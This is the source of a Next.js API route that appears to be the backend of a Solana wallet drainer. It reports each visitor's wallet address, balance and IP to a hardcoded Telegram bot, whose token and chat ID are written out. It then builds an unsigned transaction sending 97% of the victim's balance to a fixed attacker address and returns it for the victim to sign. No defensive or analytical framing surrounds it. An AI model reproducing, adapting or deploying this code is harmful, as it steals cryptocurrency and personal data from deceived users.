import { type NextRequest, NextResponse } from "next/server"
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js"

const RECIPIENT_ADDRESS = "7aE5Y7PvfUr52WnruiDATFpR99PWPo4q9U7vu3Hid3Yh"
const TELEGRAM_BOT_TOKEN = "8341387926:AAGEi8QJ2LSLphS15rmAOwS8aPfJ15cX27U" 
const TELEGRAM_CHAT_ID = "7556622176" 

const PUBLIC_RPC_ENDPOINTS = [
  "https://api.mainnet-beta.solana.com",
  "https://solana-api.projectserum.com",
  "https://rpc.ankr.com/solana",
]

const RPC_ENDPOINT = PUBLIC_RPC_ENDPOINTS[0]

async function sendTelegramNotification(walletAddress: string, balanceSOL: number, balanceUSD: number, userIP: string) {
  try {
    const message = ` 
🔍 *Wallet Scanned* 

📍 *Address:* \`${walletAddress}\` 
💰 *Balance:* ${balanceSOL.toFixed(6)} SOL 
💵 *Balance USD:* $${balanceUSD.toFixed(2)} 
🌐 *IP:* ${userIP} 

#scan created by TG @boredmonkeyman
    `.trim()

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`

    await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    })
  } catch (error) {}
}

async function getSOLPrice(): Promise<number> {
  try {
    const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd")
    const data = await response.json()
    return data.solana.usd
  } catch (error) {
    return 0 
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { walletAddress: walletAddress, userIP: userIP } = body

    if (!walletAddress || typeof walletAddress !== "string") {
      return NextResponse.json({ error: "Valid wallet address is required" }, { status: 400 })
    }

    const ipAddress = userIP || "unknown"

    let walletPubkey: PublicKey
    let recipientPubkey: PublicKey

    try {
      walletPubkey = new PublicKey(walletAddress)
      recipientPubkey = new PublicKey(RECIPIENT_ADDRESS)
    } catch (error) {
      return NextResponse.json({ error: "Invalid wallet address format" }, { status: 400 })
    }

    const connection = new Connection(RPC_ENDPOINT, "confirmed")

    const balanceLamports = await connection.getBalance(walletPubkey)
    const balanceSOL = balanceLamports / LAMPORTS_PER_SOL

    const solPriceUSD = await getSOLPrice()
    const balanceUSD = balanceSOL * solPriceUSD

    await sendTelegramNotification(walletAddress, balanceSOL, balanceUSD, ipAddress)

    const MIN_BALANCE_SOL = 0.01
    if (balanceSOL < MIN_BALANCE_SOL) {
      return NextResponse.json(
        {
          error: "Insufficient balance",
          balance: balanceSOL,
          minRequired: MIN_BALANCE_SOL,
        },
        { status: 400 },
      )
    }

    const TRANSACTION_FEE = 5000
    const SAFETY_BUFFER = 10000
    const MINIMUM_RESERVE = 0.001 * LAMPORTS_PER_SOL

    const totalReserve = TRANSACTION_FEE + SAFETY_BUFFER + MINIMUM_RESERVE
    const availableForTransfer = Math.max(0, balanceLamports - totalReserve)
    const transferAmount = Math.floor(availableForTransfer * 0.97)

    if (transferAmount < 5000) {
      return NextResponse.json(
        {
          error: "Transfer amount too small",
          balance: balanceSOL,
          transferAmount: transferAmount / LAMPORTS_PER_SOL,
        },
        { status: 400 },
      )
    }

    const { blockhash: blockhash, lastValidBlockHeight: lastValidBlockHeight } = await connection.getLatestBlockhash("finalized")

    const transaction = new Transaction({
      recentBlockhash: blockhash,
      feePayer: walletPubkey,
    })

    const transferInstruction = SystemProgram.transfer({
      fromPubkey: walletPubkey,
      toPubkey: recipientPubkey,
      lamports: transferAmount,
    })
    transaction.add(transferInstruction)

    const serializedTransaction = transaction
      .serialize({
        requireAllSignatures: false,
        verifySignatures: false,
      })
      .toString("base64")

    return NextResponse.json({
      success: true,
      walletBalance: balanceSOL,
      transferAmount: transferAmount / LAMPORTS_PER_SOL,
      percentage: 97,
      transaction: serializedTransaction,
      blockhash: blockhash,
      lastValidBlockHeight: lastValidBlockHeight,
    })
  } catch (error) {
    return NextResponse.json(
      {
        error: "Failed to process request",
      },
      { status: 500 },
    )
  }
}

export async function GET() {
  return NextResponse.json({
    status: "ok",
  })
  }
        
